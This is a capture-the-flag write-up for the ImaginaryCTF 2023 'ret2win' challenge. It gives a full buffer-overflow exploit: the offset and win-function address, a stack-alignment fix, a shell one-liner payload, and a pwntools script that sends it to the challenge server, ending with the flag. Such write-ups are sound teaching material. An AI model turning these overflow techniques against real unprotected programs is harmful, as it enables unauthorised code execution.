---
title: ImaginaryCTF 2023 - ret2win
description: Writeup for ret2win pwn challenge
date: 2023-12-18
tldr: Can you overflow the buffer and get the flag?
draft: false
tags: ["ctf", "writeup", "pwn"]
---

# ret2win

Can you overflow the buffer and get the flag? (Hint: if your exploit isn't working on the remote server, look into stack alignment)

Attachments
https://imaginaryctf.org/r/BoCID#vuln https://imaginaryctf.org/r/73iLJ#vuln.c nc ret2win.chal.imaginaryctf.org 1337


# lets find where the entrypoint to the function win is 

0040117a

# RIP

padding until we overwrite stack pointer

123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100


setting a breakpointin edb at the ret on the end of main we see that this leads to 

return to `0x3434343334323431`


# 

hardening-check vuln
vuln:
 Position Independent Executable: no, normal executable!
 Stack protected: no, not found!
 Fortify Source functions: no, only unprotected functions found!
 Read-only relocations: yes
 Immediate binding: no, not found!
 Stack clash protection: unknown, no -fstack-clash-protection instructions found
 Control flow integrity: yes


## Executing the win function


doing just `./vuln <<< $(python -c "print(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz\x11@\x00\x00\x00\x00\x00'.decode())"`

we see 

```
==3974== Process terminating with default action of signal 11 (SIGSEGV)
==3974==  General Protection Fault
==3974==    at 0x48B3603: do_system (system.c:148)
==3974==    by 0x401195: win (in /mnt/ctfa/ret2win/vuln)
```

most likely we are having problems with stack aligment this exploit works but segfaults on `movaps` instruction when executing the `libc` `system`

https://ropemporium.com/guide.html

> The MOVAPS issue. If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.

so lets just skip this initial push to `ebp` by adding 8 to the adress skipping some initial instructions of the win function

see `pwn_tool.py` we successfully get to the win function wit the following payload but still a segfault happens - a different one this time.

```python
#!/usr/bin/env python3
from pwn import *

#--------Setup--------#

context(arch="amd64", os="linux")
elf = ELF("vuln", checksec=False)
print(elf)
print(elf.sym)
ret2win = elf.sym["win"]
print(ret2win)
pattern = cyclic(1024)
print(pattern)

offset = len("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

log.info(f"{offset = }")

#--------ret2text--------#

ret2win = elf.sym["win"]
print(hex(ret2win+8))
payload = flat(
    b"\x00"*offset,
    p64(ret2win+8),
)
print(payload)

p = elf.process()

p.sendline(payload)
s = p.recvline()
print(s)
conn = remote('ret2win.chal.imaginaryctf.org',1337)
s = conn.recvline()
print(s)
conn.sendline(payload)
s = conn.recvline()
print(s)

```


`ictf{r3turn_0f_th3_k1ng?}`